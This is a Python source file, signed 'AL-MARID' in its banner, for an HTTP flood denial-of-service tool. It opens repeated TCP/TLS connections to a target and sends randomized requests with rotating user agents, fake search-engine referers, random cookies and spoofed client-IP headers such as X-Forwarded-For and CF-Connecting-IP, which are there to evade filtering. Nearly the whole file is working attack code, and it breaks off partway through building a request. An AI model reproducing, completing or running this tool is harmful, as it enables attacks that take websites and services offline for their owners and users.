import ssl
import os
import socket
import random
import threading
import time
import sys
import colorama
import json
import gzip
import base64
from colorama import Fore, Style
from urllib.parse import urlparse, quote

colorama.init()

def show_banner():
    dark_gray = "\033[38;5;235m"
    reset = "\033[0m"

    banner = f"""
{Fore.RED}▓▓▓▓▓▒░{dark_gray}██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▒░{dark_gray}████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▒░{dark_gray}██████████████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▒░{dark_gray}████████████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{dark_gray}██████████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{dark_gray}████████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{dark_gray}██████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{dark_gray}████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{dark_gray}██████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}██████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}███████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}█████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}███████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}█████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}███████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}██████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░

                 ═══════════════════════════════════════════════════════════════════════════════════════════════════════════╗
            ˗ˏ` ♡ ˎˊ˗                                                                                                       ║
                ███████╗██████╗ ███████╗███████╗    ██████╗  █████╗ ██╗     ███████╗███████╗████████╗██╗███╗   ██╗███████╗  ║
            ║   ██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔══██╗██╔══██╗██║     ██╔════╝██╔════╝╚══██╔══╝██║████╗  ██║██╔════╝  ║
            ║   █████╗  ██████╔╝█████╗  █████╗      ██████╔╝███████║██║     █████╗  ███████╗   ██║   ██║██╔██╗ ██║█████╗    ║
            ║   ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝      ██╔═══╝ ██╔══██║██║     ██╔══╝  ╚════██║   ██║   ██║██║╚██╗██║██╔══╝    ║
            ║   ██║     ██║  ██║███████╗███████╗    ██║     ██║  ██║███████╗███████╗███████║   ██║   ██║██║ ╚████║███████╗  ║
            ║   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝
            ║                                                                                                         ˗ˏ` ♡ ˎˊ˗
            ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════

                                                     "We love you so much, Palestinian people."
           "Code by AL-MARID"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
{Style.RESET_ALL}"""
    print(banner)

def delay_print(s, delay=0.001):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(delay)

attack_stats = {
    'total_packets': 0,
    'active_threads': 0,
    'start_time': time.time(),
    'running': True,
    'successful_connections': 0,
    'failed_connections': 0,
    'total_data_sent': 0
}

def generate_session_id():
    return base64.b64encode(os.urandom(24)).decode('utf-8')

def generate_cookies():
    cookies = []
    for _ in range(random.randint(3, 8)):
        name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(random.randint(5, 10)))
        value = base64.b64encode(os.urandom(12)).decode('utf-8')
        cookies.append(f'{name}={value}')
    return '; '.join(cookies)

def get_http_method():
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
    weights = [45, 25, 8, 5, 5, 5, 7]
    return random.choices(methods, weights=weights, k=1)[0]

def generate_post_data():
    data_types = ['json', 'form', 'xml', 'binary']
    data_type = random.choice(data_types)

    if data_type == 'json':
        keys = ['username', 'email', 'password', 'search', 'query', 'id', 'session', 'token']
        num_items = random.randint(3, 8)
        data = {}
        for _ in range(num_items):
            key = random.choice(keys)
            value = base64.b64encode(os.urandom(random.randint(10, 30))).decode('utf-8')
            data[key] = value
        return json.dumps(data)

    elif data_type == 'form':
        fields = ['user', 'email', 'pass', 'q', 'id', 'token', 'csrf', 'session_id']
        num_fields = random.randint(4, 10)
        form_data = []
        for _ in range(num_fields):
            field = random.choice(fields)
            value = base64.b64encode(os.urandom(random.randint(8, 24))).decode('utf-8')
            form_data.append(f"{field}={quote(value)}")
        return '&'.join(form_data)

    elif data_type == 'xml':
        tags = ['user', 'data', 'request', 'payload', 'info', 'details']
        num_tags = random.randint(3, 6)
        xml = '<?xml version="1.0" encoding="UTF-8"?>\n<root>\n'
        for _ in range(num_tags):
            tag = random.choice(tags)
            value = base64.b64encode(os.urandom(random.randint(10, 25))).decode('utf-8')
            xml += f"  <{tag}>{value}</{tag}>\n"
        xml += '</root>'
        return xml

    else:
        return base64.b64encode(os.urandom(random.randint(256, 1024))).decode('utf-8')

def enhanced_attack(ip, port, packets_per_sec):
    useragents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.3",
        "Mozilla/5.0 (iPhone15,3; U; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.2151.7",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (PlayStation; PlayStation 5/6.00) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.1",
        "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/609.4 (KHTML, like Gecko) NF/6.0.3.15.4 NintendoBrowser/5.1.0.2240",
        "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/119.0 Firefox/119.",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.3",
        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3",
        "Mozilla/5.0 (Xbox; Xbox-One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edge/44.18363.813",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.3",
        "Mozilla/5.0 (iPhone14,2; U; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.1",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Vivaldi/6.2.3105.5",
        "Mozilla/5.0 (Linux; Android 14; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.3",
        "Mozilla/5.0 (PlayStation 5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.",
        "Mozilla/5.0 (X11; CrOS x86_64 15359.58.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.134 Safari/537.3",
        "Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/119.0.6045.163 Mobile Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/119.",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:109.0) Gecko/20100101 Firefox/119.",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.3",
        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edge/44.18363.813",
        "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.3",
        "Mozilla/5.0 (iPhone15,2; U; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Android 14; Tablet; rv:109.0) Gecko/119.0 Firefox/119.",
        "Mozilla/5.0 (Linux; Android 14; SM-F731B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.3",
        "Mozilla/5.0 (PlayStation Vita 3.73) AppleWebKit/536.26 (KHTML, like Gecko) Silk/3.2",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Whale/3.23.217.2",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.",
        "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.3",
        "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.1",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-M536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.3",
        "Mozilla/5.0 (PlayStation 4 11.00) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.2151.7",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.",
        "Mozilla/5.0 (Linux; Android 14; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.3",
        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.",
        "Mozilla/5.0 (Linux; Android 14; SM-A256B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.3",
        "Mozilla/5.0 (iPhone SE; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Vivaldi/6.2.3105.5",
        "Mozilla/5.0 (Linux; Android 14; SM-X716B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Safari/537.3",
        "Mozilla/5.0 (PlayStation 5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.",
        "Mozilla/5.0 (X11; OpenBSD amd64; rv:109.0) Gecko/20100101 Firefox/119.",
        "Mozilla/5.0 (Linux; Android 14; SM-T736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Safari/537.3",
        "Mozilla/5.0 (iPad Pro; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like) Version/17.1 Mobile/15E148 Safari/604.",
        "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.",
        "Mozilla/5.0 (Linux; Android 14; SM-X810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Safari/537.3"
    ]

    refs = [
        'https://www.google.com/search?q=',
        'https://www.bing.com/search?q=',
        'https://search.yahoo.com/search?p=',
        'https://duckduckgo.com/?q=',
        'https://yandex.com/search/?text=',
        'https://www.ecosia.org/search?q=',
        'https://www.baidu.com/s?wd=',
        'https://www.qwant.com/?q=',
        'https://search.brave.com/search?q=',
        'https://www.startpage.com/sp/search?query=',
        'https://www.swisscows.com/web?query=',
        'https://www.mojeek.com/search?q=',
        'https://www.gigablast.com/search?q=',
        'https://www.searchencrypt.com/search?q=',
        'https://www.metager.org/meta/meta.ger3?eingabe='
    ]

    accept_headers = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "*/*",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/json, text/javascript, */*; q=0.01",
        "text/css,*/*;q=0.1",
        "image/webp,image/*,*/*;q=0.8",
        "video/webm,video/ogg,video/*;q=0.9,application/ogg;q=0.7,audio/*;q=0.6,*/*;q=0.5",
        "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "application/json, text/javascript, */*; q=0.01",
        "text/css,*/*;q=0.1",
        "image/webp,image/*,*/*;q=0.8",
        "video/webm,video/ogg,video/*;q=0.9,application/ogg;q=0.7,audio/*;q=0.6,*/*;q=0.5",
        "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "application/json, text/javascript, */*; q=0.01",
        "text/css,*/*;q=0.1",
        "image/webp,image/*,*/*;q=0.8",
        "video/webm,video/ogg,video/*;q=0.9,application/ogg;q=0.7,audio/*;q=0.6,*/*;q=0.5",
        "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "application/json, text/javascript, */*; q=0.01",
        "text/css,*/*;q=0.1",
        "image/webp,image/*,*/*;q=0.8",
        "video/webm,video/ogg,video/*;q=0.9,application/ogg;q=0.7,audio/*;q=0.6,*/*;q=0.5",
        "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "application/json, text/javascript, */*; q=0.01",
        "text/css,*/*;q=0.1",
        "image/webp,image/*,*/*;q=0.8",
        "video/webm,video/ogg,video/*;q=0.9,application/ogg;q=0.7,audio/*;q=0.6,*/*;q=0.5"
    ]

    additional_headers = [
        "Accept-Language: en-US,en;q=0.9,ar;q=0.8",
        "Accept-Encoding: gzip, deflate, br",
        "Cache-Control: no-cache, no-store, must-revalidate",
        "Upgrade-Insecure-Requests: 1",
        "DNT: 1",
        "Pragma: no-cache",
        "TE: Trailers",
        "X-Requested-With: XMLHttpRequest",
        "X-Forwarded-For: {}.{}.{}.{}".format(random.randint(1,255), random.randint(1,255),
                                              random.randint(1,255), random.randint(1,255)),
        "X-Client-IP: {}.{}.{}.{}".format(random.randint(1,255), random.randint(1,255),
                                         random.randint(1,255), random.randint(1,255)),
        "X-Real-IP: {}.{}.{}.{}".format(random.randint(1,255), random.randint(1,255),
                                       random.randint(1,255), random.randint(1,255)),
        "CF-Connecting-IP: {}.{}.{}.{}".format(random.randint(1,255), random.randint(1,255),
                                              random.randint(1,255), random.randint(1,255)),
        "True-Client-IP: {}.{}.{}.{}".format(random.randint(1,255), random.randint(1,255),
                                            random.randint(1,255), random.randint(1,255))
    ]

    session_id = generate_session_id()
    target_str = f"{ip}:{port}"
    thread_name = threading.current_thread().name

    protocol = 'https' if port == 443 else 'http'

    while attack_stats['running']:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.settimeout(3)

            if protocol == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=ip)

            s.connect((ip, port))
            attack_stats['successful_connections'] += 1

            for req_num in range(random.randint(1, 8)):
                http_method = get_http_method()
                post_data = ''
                content_headers = []

                if http_method in ['POST', 'PUT', 'PATCH']:
                    post_data = generate_post_data()
                    content_length = len(post_data)
                    content_headers.append(f"Content-Length: {content_length}")

                    content_types = [
                        "application/x-www-form-urlencoded",
                        "application/json",
                        "application/xml",
                        "text/plain",
                        "multipart/form-data; boundary=----WebKitFormBoundary{}".format(
                            ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
                        )
                    ]
                    content_headers.append(f"Content-Type: {random.choice(content_types)}")

                    if random.random() > 0.7:
                        compressed_data = gzip.compress(post_data.encode())
                        post_data = compressed_data
                        content_headers.append("Content-Encoding: gzip")
                        content_headers[0] = f"Content-Length: {len(compressed_data)}"

                paths = [
                    f'/{random.choice(["home", "index", "main", "page", "dashboard"])}',
                    f'/{random.choice(["api", "v1", "v2", "rest"])}/{random.choice(["user", "data", "auth"])}',
                    f'/{random.choice(["article", "news", "blog", "post"])}/{random.randint(1000, 9999)}',
                    f'/{random.choice(["user", "profile", "account", "member"])}/{random.randint(1, 10000)}',
                    f'/{random.choice(["search", "find", "query", "lookup"])}?q={random.choice(["term", "keyword", "phrase", "search"])}',
                    f'/{random.choice(["product", "item", "offer", "deal"])}/{random.randint(100, 999)}',
                    f'/{random.choice(["download", "file", "resource"])}/{random.randint(1000, 9999)}',
                    f'/{random.choice(["image", "photo", "picture", "gallery"])}/{random.randint(1, 100)}',
                    f'/{random.choice(["video", "movie", "clip", "stream"])}/{random.randint(1, 500)}'
                ]

                path = random.choice(paths)
                host_header = f"Host: {ip}"
                user_agent = f"User-Agent: {random.choice(useragents)}"
                accept = f"Accept: {random.choice(accept_headers)}"
                referer = f"Referer: {random.choice(refs)}{random.randint(1000000, 9999999)}"
                connection = "Connection: keep-alive"
                cookie = f"Cookie: session_id={session_id}; {generate_cookies()}"

                extra_headers = random.sample(additional_headers, k=random.randint(4, 8))

                request = (
                    f"{http_method} {path} HTTP/1.1\r\n"
                    f"{host_header}\r\n"
                    f"{user_agent}\r\n"
                    f"{accept}\r\n"
                    f"{referer}\r\n"
                    f"{connection}\r\n"
                    f"{cookie}\r\n"
